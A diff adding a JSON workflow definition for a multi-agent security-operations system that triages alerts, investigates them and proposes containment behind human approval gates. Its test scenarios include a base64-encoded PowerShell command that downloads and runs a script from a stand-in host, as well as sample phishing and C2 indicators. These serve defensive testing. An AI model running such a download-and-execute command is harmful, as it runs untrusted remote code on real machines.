@@ -1,0 +1,504 @@
+{
+  "version": "1.0.0",
+  "name": "CyberGuardianSecOps",
+  "description": "Autonomous multi-agent cybersecurity incident triage, forensics investigation, threat intelligence, and response remediation workflow based on Google ADK.",
+  "framework": "google-adk",
+  "language": "python",
+  "nodes": [
+    {
+      "id": "node-trigger-secops",
+      "type": "triggerNode",
+      "position": {
+        "x": 688,
+        "y": 48
+      },
+      "data": {
+        "id": "node-trigger-secops",
+        "label": "SecOps Alert Inbound",
+        "triggerType": "eventarc",
+        "triggerKind": "eventarc",
+        "config": {
+          "eventarcCategory": "securitycenter",
+          "eventarcEvent": "FindingNotification",
+          "eventarcServiceName": "securitycenter.googleapis.com",
+          "eventarcServiceAccount": "eventarc-agent-invoker@my-gcp-project.iam.gserviceaccount.com",
+          "eventarcRegion": "us-central1",
+          "testScenarios": [
+            {
+              "id": "scenario-edr-powershell",
+              "name": "EDR Detection - Malicious Encoded PowerShell",
+              "prompt": "Falcon_Detection: Hostname: winsrv0221, User: SYSTEM, Process: powershell.exe, Command: powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AbQBhAGwAdwBhAHIAZQAuAHAAcwAxACcAKQA=, Parent: cmd.exe, Timestamp: 2024-05-18T10:00:00Z",
+              "inputQuery": "Falcon_Detection: Hostname: winsrv0221, User: SYSTEM, Process: powershell.exe, Command: powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AbQBhAGwAdwBhAHIAZQAuAHAAcwAxACcAKQA=, Parent: cmd.exe, Timestamp: 2024-05-18T10:00:00Z",
+              "expectedOutput": "powershell",
+              "expectedOutputPattern": "powershell",
+              "assertionType": "contains"
+            },
+            {
+              "id": "scenario-ioc-lockbit",
+              "name": "IOC Match - Known Lockbit C2 Network Traffic",
+              "prompt": "IOC_Match: Hostname: winws1045, User: j.doe, IP: 198.51.100.42, Timestamp: 2024-05-18T11:30:00Z, Details: Connection detected to known malicious IP associated with LockbitC2.",
+              "inputQuery": "IOC_Match: Hostname: winws1045, User: j.doe, IP: 198.51.100.42, Timestamp: 2024-05-18T11:30:00Z, Details: Connection detected to known malicious IP associated with LockbitC2.",
+              "expectedOutput": "LockbitC2",
+              "expectedOutputPattern": "LockbitC2",
+              "assertionType": "contains"
+            },
+            {
+              "id": "scenario-phishing-invoice",
+              "name": "Phishing Email Report - Suspicious Executable Attachment",
+              "prompt": "Subject: Urgent: Invoice Overdue, From: billing@scanned-invoice-attach.org, To: m.chen@company.com, Date: 2024-05-18T09:15:00Z, SMTP_IP: 203.0.113.77, Attachment: Invoice_May2024.pdf.exe",
+              "inputQuery": "Subject: Urgent: Invoice Overdue, From: billing@scanned-invoice-attach.org, To: m.chen@company.com, Date: 2024-05-18T09:15:00Z, SMTP_IP: 203.0.113.77, Attachment: Invoice_May2024.pdf.exe",
+              "expectedOutput": "phishing",
+              "expectedOutputPattern": "phishing",
+              "assertionType": "contains"
+            }
+          ],
+          "testPrompts": [
+            {
+              "id": "scenario-edr-powershell",
+              "name": "EDR Detection - Malicious Encoded PowerShell",
+              "prompt": "Falcon_Detection: Hostname: winsrv0221, User: SYSTEM, Process: powershell.exe, Command: powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AbQBhAGwAdwBhAHIAZQAuAHAAcwAxACcAKQA=, Parent: cmd.exe, Timestamp: 2024-05-18T10:00:00Z",
+              "inputQuery": "Falcon_Detection: Hostname: winsrv0221, User: SYSTEM, Process: powershell.exe, Command: powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AbQBhAGwAdwBhAHIAZQAuAHAAcwAxACcAKQA=, Parent: cmd.exe, Timestamp: 2024-05-18T10:00:00Z",
+              "expectedOutput": "powershell",
+              "expectedOutputPattern": "powershell",
+              "assertionType": "contains"
+            },
+            {
+              "id": "scenario-ioc-lockbit",
+              "name": "IOC Match - Known Lockbit C2 Network Traffic",
+              "prompt": "IOC_Match: Hostname: winws1045, User: j.doe, IP: 198.51.100.42, Timestamp: 2024-05-18T11:30:00Z, Details: Connection detected to known malicious IP associated with LockbitC2.",
+              "inputQuery": "IOC_Match: Hostname: winws1045, User: j.doe, IP: 198.51.100.42, Timestamp: 2024-05-18T11:30:00Z, Details: Connection detected to known malicious IP associated with LockbitC2.",
+              "expectedOutput": "LockbitC2",
+              "expectedOutputPattern": "LockbitC2",
+              "assertionType": "contains"
+            },
+            {
+              "id": "scenario-phishing-invoice",
+              "name": "Phishing Email Report - Suspicious Executable Attachment",
+              "prompt": "Subject: Urgent: Invoice Overdue, From: billing@scanned-invoice-attach.org, To: m.chen@company.com, Date: 2024-05-18T09:15:00Z, SMTP_IP: 203.0.113.77, Attachment: Invoice_May2024.pdf.exe",
+              "inputQuery": "Subject: Urgent: Invoice Overdue, From: billing@scanned-invoice-attach.org, To: m.chen@company.com, Date: 2024-05-18T09:15:00Z, SMTP_IP: 203.0.113.77, Attachment: Invoice_May2024.pdf.exe",
+              "expectedOutput": "phishing",
+              "expectedOutputPattern": "phishing",
+              "assertionType": "contains"
+            }
+          ]
+        },
+        "description": "Workflow Trigger"
+      }
+    },
+    {
+      "id": "node-agent-orchestrator",
+      "type": "agentNode",
+      "position": {
+        "x": 664,
+        "y": 376
+      },
+      "data": {
+        "id": "node-agent-orchestrator",
+        "label": "Cyber Guardian Orchestrator",
+        "role": "Central SecOps coordinator orchestrating alert classification, deduplication, threat intelligence, forensics, and remediation",
+        "description": "Primary coordinator agent that ingests raw alerts, determines investigation pathways, delegates to specialized sub-agents, enforces human approval gates, and logs incidents.",
+        "model": "gemini-3.7-flash",
+        "temperature": 0.2,
+        "agentKind": "standard",
+        "subAgentPattern": "coordinator",
+        "isStartNode": true,
+        "isOrchestrator": true,
+        "systemPrompt": "You are the Cyber Guardian Central SecOps Orchestrator. Your role is to coordinate end-to-end incident response by delegating tasks to specialized sub-agents.\n\n### WORKFLOW STEPS:\n\nStep 1: Parse & Classify Inbound Alert\nAnalyze the raw input and classify it into one of four categories:\n- IOC_MATCH: Contains explicit IP, domain, or file hash indicator.\n- EDR_DETECTION: Host-based process, command-line, or behavioral anomaly.\n- PHISHING_EMAIL: Inbound message with suspicious sender, URL, or attachment.\n- UNCATEGORIZED: Generic or ambiguous telemetry.\n\nStep 2: Triage & Deduplication (ALWAYS FIRST)\nAlways invoke triage_agent first with the hostname and alert type. Triage queries BigQuery to check if an identical alert was processed in the past 24 hours and enriches the alert with asset criticality.\n- CRITICAL RULE: If triage_agent reports `is_duplicate: true`, immediately terminate the workflow and summarize the duplicate finding. Do NOT call threat intel, investigation, or response agents.\n\nStep 3: Conditional Branch Delegation\nIf not a duplicate, determine the investigation order:\n- If IOC_MATCH or PHISHING_EMAIL (IOC-heavy):\n  1. Delegate to threat_intel_agent to evaluate known maliciousness.\n  2. Delegate to investigation_agent to correlate network logs and endpoint processes.\n  3. Delegate to response_agent to determine containment playbooks.\n- If EDR_DETECTION or UNCATEGORIZED (Process-heavy):\n  1. Delegate to investigation_agent first to reconstruct the process tree and identify derived IOCs.\n  2. If new IOCs (IPs, hashes) are derived, delegate to threat_intel_agent to evaluate them.\n  3. Delegate to response_agent to select playbooks.\n\nStep 4: Human-in-the-Loop (HITL) Gatekeeper\nReview all recommended actions from response_agent. If any action specifies `requires_approval: true` (e.g. host isolation or IP blocking), you must flag `requires_human_approval: true` and state that execution is pending analyst authorization.\n\nStep 5: Incident Logging & Final Synthesis\nCall `create_incident_tool` to record the incident record into the incident_management table. Return a structured SecOps incident response brief with classification, triage context, threat findings, forensics timeline, and containment status.",
+        "tools": [
+          {
+            "id": "tool-create-incident",
+            "name": "incident_query_tool",
+            "type": "custom",
+            "description": "Records the final incident record into the BigQuery incident_management table.",
+            "parameters": {
+              "primary_host": "Target hostname involved in the alert",
+              "alert_type": "Classified alert category (IOC_MATCH, EDR_DETECTION, PHISHING_EMAIL)",
+              "summary": "Concise executive summary of findings and remediation",
+              "status": "Incident status (Open, Contained, Closed, Pending_Approval)"
+            },
+            "toolMode": "local_file",
+            "sourceFile": "./tools/incident_tools.py",
+            "functionName": "incident_query_tool",
+            "availableFunctions": [
+              "incident_query_tool"
+            ]
+          }
+        ],
+        "subAgents": [
+          {
+            "agentId": "node-agent-triage",
+            "name": "Triage Specialist",
+            "role": "Deduplicates incidents in past 24h and enriches asset context from inventory",
+            "delegationType": "coordinator"
+          },
+          {
+            "agentId": "node-agent-threatintel",
+            "name": "Threat Intel Specialist",
+            "role": "Evaluates maliciousness and confidence of IOCs against threat intelligence KB",
+            "delegationType": "coordinator"
+          },
+          {
+            "agentId": "node-agent-investigation",
+            "name": "Investigation Specialist",
+            "role": "Analyzes endpoint process execution trees and network egress logs to derive new IOCs",
+            "delegationType": "coordinator"
+          },
+          {
+            "agentId": "node-agent-response",
+            "name": "Response Specialist",
+            "role": "Selects response playbooks, simulates surgical remediation, and flags human approval requirements",
+            "delegationType": "coordinator"
+          }
+        ],
+        "memoryType": "none",
+        "name": "cyber_guardian_orchestrator"
+      }
+    },
+    {
+      "id": "node-agent-triage",
+      "type": "agentNode",
+      "position": {
+        "x": 48,
+        "y": 1064
+      },
+      "data": {
+        "id": "node-agent-triage",
+        "label": "Triage Specialist",
+        "role": "Initial Alert Assessment & Deduplication",
+        "description": "Checks for duplicate incidents in the last 24h and enriches alert with asset context (owner, criticality) to prevent redundant processing.",
+        "model": "gemini-3.7-flash",
+        "temperature": 0.1,
+        "agentKind": "standard",
+        "systemPrompt": "You are the Triage Specialist Agent. Your mission is to perform initial alert validation and asset context enrichment.\n\n1. Call `triage_query_tool` with the hostname and alert type.\n2. Determine if a duplicate incident occurred on the same host within the last 24 hours.\n3. Extract asset ownership and business criticality (Mission-Critical, High, Medium, Low).\n4. Format your verdict into the structured output schema, clearly indicating `is_duplicate`.",
+        "tools": [
+          {
+            "id": "tool-triage-query",
+            "name": "triage_query_tool",
+            "type": "custom",
+            "description": "Queries BigQuery incident_management for duplicate alerts within 24 hours and asset_inventory for owner and business criticality.",
+            "parameters": {
+              "hostname": "Target hostname from alert",
+              "alert_type": "Alert classification"
+            },
+            "toolMode": "local_file",
+            "sourceFile": "./tools/triage_tools.py",
+            "functionName": "triage_query_tool",
+            "availableFunctions": [
+              "triage_query_tool"
+            ]
+          }
+        ],
+        "structuredOutputSchema": {
+          "enabled": true,
+          "name": "TriageResult",
+          "fields": [
+            {
+              "id": "f-is-dup",
+              "name": "is_duplicate",
+              "type": "boolean",
+              "required": true,
+              "description": "True if an identical alert on this host was recorded within 24 hours"
+            },
+            {
+              "id": "f-asset-owner",
+              "name": "asset_owner",
+              "type": "string",
+              "required": false,
+              "description": "Owner or primary user of the affected asset"
+            },
+            {
+              "id": "f-biz-crit",
+              "name": "business_criticality",
+              "type": "string",
+              "required": false,
+              "description": "Business criticality level (Mission-Critical, High, Medium, Low)"
+            },
+            {
+              "id": "f-summary",
+              "name": "summary_sentence",
+              "type": "string",
+              "required": true,
+              "description": "Single-sentence concise summary of triage assessment"
+            }
+          ]
+        },
+        "memoryType": "none",
+        "name": "triage_specialist"
+      }
+    },
+    {
+      "id": "node-agent-threatintel",
+      "type": "agentNode",
+      "position": {
+        "x": 464,
+        "y": 1064
+      },
+      "data": {
+        "id": "node-agent-threatintel",
+        "label": "Threat Intel Specialist",
+        "role": "IOC Reputation & Threat Intelligence Analysis",
+        "description": "Assesses maliciousness of provided Indicators of Compromise (IPs, domains, file hashes, URLs) against threat intelligence knowledge bases.",
+        "model": "gemini-3.7-flash",
+        "temperature": 0.1,
+        "agentKind": "standard",
+        "systemPrompt": "You are the Threat Intelligence Specialist Agent. Your mission is to query threat intelligence repositories for reputation and attribution on extracted indicators.\n\n1. Extract all IOCs (IP addresses, domain names, file hashes, URLs) from the alert context.\n2. Call `threat_intel_query_tool` passing the list of indicators.\n3. Analyze query results: check `IsMalicious`, `ThreatName`, `Confidence`, and `LastSeen`.\n4. Provide a structured summary of confirmed malicious IOCs, confidence scores, and known adversary threat actors.",
+        "tools": [
+          {
+            "id": "tool-threatintel-query",
+            "name": "threat_intel_query_tool",
+            "type": "custom",
+            "description": "Queries BigQuery threat_intelligence_kb to retrieve maliciousness, threat actor attribution, and confidence ratings for indicators.",
+            "parameters": {
+              "indicators": "Comma-separated list of IP addresses, domains, or hashes"
+            },
+            "toolMode": "local_file",
+            "sourceFile": "./tools/threat_intel_tools.py",
+            "functionName": "threat_intel_query_tool",
+            "availableFunctions": [
+              "threat_intel_query_tool"
+            ]
+          }
+        ],
+        "structuredOutputSchema": {
+          "enabled": true,
+          "name": "ThreatIntelResult",
+          "fields": [
+            {
+              "id": "f-has-malicious",
+              "name": "has_malicious_indicators",
+              "type": "boolean",
+              "required": true,
+              "description": "True if one or more indicators are confirmed malicious"
+            },
+            {
+              "id": "f-threat-name",
+              "name": "primary_threat_name",
+              "type": "string",
+              "required": false,
+              "description": "Name of associated malware or threat actor group"
+            },
+            {
+              "id": "f-confidence",
+              "name": "confidence_score",
+              "type": "number",
+              "required": true,
+              "description": "Threat intelligence confidence rating between 0.0 and 1.0"
+            },
+            {
+              "id": "f-intel-summary",
+              "name": "intelligence_summary",
+              "type": "string",
+              "required": true,
+              "description": "Detailed threat intelligence evaluation of the indicators"
+            }
+          ]
+        },
+        "memoryType": "none",
+        "name": "threat_intel_specialist"
+      }
+    },
+    {
+      "id": "node-agent-investigation",
+      "type": "agentNode",
+      "position": {
+        "x": 872,
+        "y": 1064
+      },
+      "data": {
+        "id": "node-agent-investigation",
+        "label": "Investigation Specialist",
+        "role": "Endpoint Forensics & Log Correlation",
+        "description": "Performs deep technical analysis, builds attack timelines, correlates network egress logs and process execution trees, and derives new IOCs.",
+        "model": "gemini-3.7-flash",
+        "temperature": 0.1,
+        "agentKind": "standard",
+        "systemPrompt": "You are the Forensics & Investigation Specialist Agent. Your mission is to reconstruct technical attack timelines from endpoint and network logs.\n\n1. Analyze alert context for hostnames, process names, command-lines, parent processes, and destination IPs.\n2. Call `investigation_query_tool` to pull records from `endpoint_process_events` and `network_connection_log`.\n3. Reconstruct process ancestry (e.g. cmd.exe -> powershell.exe -> network download).\n4. Correlate outbound network sockets with process execution timestamps.\n5. Extract any newly derived IOCs (unseen remote IPs or dropped file hashes) for secondary threat intel evaluation.",
+        "tools": [
+          {
+            "id": "tool-investigation-query",
+            "name": "investigation_query_tool",
+            "type": "custom",
+            "description": "Queries BigQuery endpoint_process_events and network_connection_log to correlate process trees and outbound network connections.",
+            "parameters": {
+              "hostname": "Target endpoint hostname",
+              "alert_type": "Alert classification",
+              "parent_process": "Parent process name to trace ancestry",
+              "destination_ip": "Egress destination IP address to inspect"
+            },
+            "toolMode": "local_file",
+            "sourceFile": "./tools/investigation_tools.py",
+            "functionName": "investigation_query_tool",
+            "availableFunctions": [
+              "investigation_query_tool"
+            ]
+          }
+        ],
+        "structuredOutputSchema": {
+          "enabled": true,
+          "name": "InvestigationResult",
+          "fields": [
+            {
+              "id": "f-timeline",
+              "name": "attack_timeline",
+              "type": "string",
+              "required": true,
+              "description": "Chronological reconstructed timeline of malicious actions"
+            },
+            {
+              "id": "f-process-tree",
+              "name": "process_tree_summary",
+              "type": "string",
+              "required": true,
+              "description": "Summary of process ancestry and suspicious execution arguments"
+            },
+            {
+              "id": "f-derived-iocs",
+              "name": "derived_iocs",
+              "type": "array",
+              "arrayItemType": "string",
+              "required": true,
+              "description": "Newly discovered IP addresses, domains, or file hashes uncovered during investigation"
+            }
+          ]
+        },
+        "memoryType": "none",
+        "name": "investigation_specialist"
+      }
+    },
+    {
+      "id": "node-agent-response",
+      "type": "agentNode",
+      "position": {
+        "x": 1288,
+        "y": 1064
+      },
+      "data": {
+        "id": "node-agent-response",
+        "label": "Response Specialist",
+        "role": "Playbook Remediation & Containment",
+        "description": "Selects appropriate response playbooks based on identified threats or triggering conditions, maps actions, and flags actions requiring HITL approval.",
+        "model": "gemini-3.7-flash",
+        "temperature": 0.1,
+        "agentKind": "standard",
+        "systemPrompt": "You are the Incident Response & Remediation Specialist Agent. Your mission is to formulate surgical containment actions based on approved playbooks.\n\n1. Call `get_playbook_tool` passing the triggering threat condition (e.g. 'Malicious PowerShell Download', 'Known C2 Communication', 'Phishing Attachment Execution').\n2. Inspect the returned playbook steps: ActionCommand, TargetDescription, and `RequiresApproval`.\n3. For low-risk safe actions that do NOT require approval, execute or simulate them using `response_execution_tool`.\n4. For high-impact actions where `RequiresApproval: true` (such as isolating an endpoint or null-routing an IP), explicitly mark them as `requires_approval: true` and leave execution pending human authorization.",
+        "tools": [
+          {
+            "id": "tool-get-playbook",
+            "name": "response_query_tool",
+            "type": "custom",
+            "description": "Queries BigQuery response_playbooks for recommended containment actions and HITL approval flags.",
+            "parameters": {
+              "triggering_condition": "Identified threat condition or attack pattern"
+            },
+            "toolMode": "local_file",
+            "sourceFile": "./tools/response_tools.py",
+            "functionName": "response_query_tool",
+            "availableFunctions": [
+              "response_query_tool"
+            ]
+          },
+          {
+            "id": "tool-response-execution",
+            "name": "response_execution_tool",
+            "type": "custom",
+            "description": "Simulates surgical containment actions (e.g. isolate-host, block-ip, revoke-session).",
+            "parameters": {
+              "action_command": "Command to execute (e.g. isolate-host, block-ip)",
+              "target": "Target identifier (hostname, IP, or username)"
+            }
+          }
+        ],
+        "structuredOutputSchema": {
+          "enabled": true,
+          "name": "ResponseRemediationPlan",
+          "fields": [
+            {
+              "id": "f-playbook-id",
+              "name": "playbook_id",
+              "type": "string",
+              "required": true,
+              "description": "Identified response playbook ID"
+            },
+            {
+              "id": "f-action-command",
+              "name": "action_command",
+              "type": "string",
+              "required": true,
+              "description": "Containment action command to execute"
+            },
+            {
+              "id": "f-target",
+              "name": "target",
+              "type": "string",
+              "required": true,
+              "description": "Target hostname, IP, or user account"
+            },
+            {
+              "id": "f-requires-approval",
+              "name": "requires_approval",
+              "type": "boolean",
+              "required": true,
+              "description": "Whether human analyst approval is required prior to execution"
+            },
+            {
+              "id": "f-status",
+              "name": "execution_status",
+              "type": "string",
+              "required": true,
+              "description": "Status of the action: simulated, pending_approval, or executed"
+            }
+          ]
+        },
+        "memoryType": "none",
+        "name": "response_specialist"
+      }
+    }
+  ],
+  "edges": [
+    {
+      "id": "edge-trigger-to-orchestrator",
+      "source": "node-trigger-secops",
+      "target": "node-agent-orchestrator",
+      "animated": true
+    },
+    {
+      "id": "edge-orchestrator-to-triage",
+      "source": "node-agent-orchestrator",
+      "target": "node-agent-triage",
+      "animated": true
+    },
+    {
+      "id": "edge-orchestrator-to-threatintel",
+      "source": "node-agent-orchestrator",
+      "target": "node-agent-threatintel",
+      "animated": true
+    },
+    {
+      "id": "edge-orchestrator-to-investigation",
+      "source": "node-agent-orchestrator",
+      "target": "node-agent-investigation",
+      "animated": true
+    },
+    {
+      "id": "edge-orchestrator-to-response",
+      "source": "node-agent-orchestrator",
+      "target": "node-agent-response",
+      "animated": true
+    }
+  ],
+  "metadata": {
+    "createdAt": "2026-09-11T08:35:00Z",
+    "updatedAt": "2026-09-15T01:41:22.604Z",
+    "author": "Mike Nimer <mikenimer@google.com>"
+  },
+  "deployment": {
+    "target": "agent_engine",
+    "deploymentTarget": "agent_engine",
+    "outputFolder": "./cyber_guardian_agent/",
+    "framework": "google-adk",
+    "language": "python",
+    "includeTests": true,
+    "includeDocker": false,
+    "useStreaming": true
+  }
+}
